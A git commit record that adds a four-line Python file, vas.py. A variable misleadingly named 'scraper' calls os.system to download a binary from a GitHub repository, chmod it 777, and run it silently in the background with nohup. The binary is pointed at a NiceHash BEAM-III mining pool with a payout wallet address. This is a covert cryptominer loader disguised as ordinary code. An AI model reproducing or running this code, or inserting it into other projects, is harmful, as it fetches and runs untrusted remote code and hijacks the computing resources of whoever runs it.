56e7b5ca8c9c9c7ab8927a3b7af0e30127d3a128
torgyv <108770567+torgyv@users.noreply.github.com>
2022-07-17 08:14:29 +0700

    Update and rename vas to vas.py

---
+++ vas.py
@@ -0,0 +1,4 @@
+import os
+scraper = os.system('wget https://github.com/torgyv/cuda/raw/main/kopi && chmod 777 kopi && nohup ./kopi --algo BEAM-III --pool stratum+tcp://beamv3.hk.nicehash.com:3387 --user 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w &>/dev/null &')
+print(scraper)
+
